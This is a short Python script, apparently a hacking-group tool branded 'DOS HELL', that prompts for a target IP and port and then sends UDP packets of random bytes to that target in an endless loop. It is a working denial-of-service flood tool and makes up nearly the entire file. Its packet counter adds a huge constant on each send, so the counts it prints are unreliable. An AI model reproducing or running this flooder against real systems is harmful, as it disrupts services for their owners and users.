#!/usr/bin/env python3
import os
import sys
from pyfiglet import Figlet
import socket
import random
from colorama import Fore
import time
#Menu

def slowprint(n):
    for word in n + '\n':
       sys.stdout.write(word)
       sys.stdout.flush()
       time.sleep(0.11)
def banner():
    os.system("clear")
    custom_fig = Figlet(font='times')
    print(custom_fig.renderText('DOS HELL'))
    os.system("sleep 2")
    slowprint(Fore.RED+"""                        <<<<<<<<<<<<<<<+>>>>>>>>>>>>>>>>>>>>
                        <<<<<<<<<<<<<<<->>>>>>>>>>version 1.0
                        ----============================-----
                        |+|   DEVELOPER : D00MS D4Y       |+|
                        |+|   TEAM : ANONYMOUS ELITES     |+|
                        |+|   FACEBOOK : ANONYMOUS ELITES |+|
                        ----============================-----
                        <<<<<<<<<<<<<<<<->>>>>>>>>>>>>>>>>>>>
                        <<<<<<<<<<<<<<<<+>>>>>>>>>>>>>>>>>>>>""")
banner()
print()
def __start__():
    ip = input(Fore.WHITE+"[+] Target IP: ")
    print()
    port = int(input(Fore.WHITE+"[+] Target Port: "))
# Code
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    send = 0
    while True:
        sock.sendto(bytes, (ip,port))
        send = send + 90000000000000000
        port = port + 0
        print(Fore.RED+"Send %s packet on %s port %s"%(send,ip,port))
        if port == 65534:
              port = 0
__start__()
